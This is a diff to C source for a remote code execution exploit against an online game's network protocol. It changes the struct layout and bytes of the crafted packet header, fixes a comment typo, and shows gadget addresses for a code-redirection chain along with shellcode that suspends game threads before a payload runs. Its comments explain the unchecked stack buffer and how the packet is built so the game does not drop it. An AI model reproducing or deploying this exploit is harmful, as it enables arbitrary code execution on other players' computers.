@@ -31,16 +31,16 @@ static const uint8_t rce_header[] = {
 	0xB0, 0xF3, 0x14, 0x00, 
 	
 	0x4E, 0x58, 0x52, 0x56, // NRSSR signature
-	0x05, 0x84,				// NRSSR version number
-	0x04, 0x00,				// Number of entries in the property list
+	0x05, 0x84,		// NRSSR version number
+	0x04,			// Number of entries in the property list
 
 	// NRSSR property list: The existence of these fields is essential to the exploit. 
 	// This data consists of a chain of fields - 4/8 byte integers or strings encoded as follows: 
 	// struct NRSSRProperty {
 	//     uint32_t id;
-	//	   uint8_t unknown;
-	//	   uint8_t type;	// 1 = 4 byte, 2 and 3 = 8 byte, 4 = null terminated wide string
-	//	   uint8_t value[0];
+	//     uint8_t type;	// 1 = 4 byte, 2 and 3 = 8 byte, 4 = null terminated wide string
+	//     uint8_t unknown;
+	//     uint8_t value[0];
 	// }
 	// Note that the game uses a stack buffer with no bounds check to copy the string properties, 
 	// allowing the exploit to be initiated from here as well. However we use the host name field 
@@ -50,7 +50,7 @@ static const uint8_t rce_header[] = {
 	// from the start of the packet, which will allow us to setup a code redirection chain via 
 	// virtual calls. However if the type of any property is invalid the game will drop our packet,
 	// so we still have to construct it carefully. 
-	0x00, 0x00, 0x00, 0x04, 0x00, 0x01, 0x01, 0x01,
+	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x01, 0x01, 0x01,
 
 	// Offset 0x18: 140e97700 (loads 144786150 into rax, then returns)
 	0x00, 0x77, 0xE9, 0x40, 0x01, 0x00, 0x00, 0x00, 
@@ -87,7 +87,7 @@ static const uint8_t rce_header[] = {
 // Because the exploit overwrites large amounts of game memory which may be accessed by other threads, doing 
 // this instead of directly jumping to the payload allows us to use the full maximum theoretical payload size 
 // and makes the exploit extremely reliable. The small size of this routine allows us to load it in a region 
-// where other game thrwads do not write to memory at all, or at least very rarely.
+// where other game threads do not write to memory at all, or at least very rarely.
 static const uint8_t rce_suspend_threads[] = { 
 	0x48, 0x83, 0xEC, 0x48, 0x48, 0xB9, 0xEA, 0x9D, 0xFC, 0x41, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15,
 	0x2C, 0xD3, 0x61, 0x00, 0xFF, 0x15, 0x0E, 0xD4, 0x61, 0x00, 0x4C, 0x8B, 0xE0, 0xFF, 0x15, 0x05,
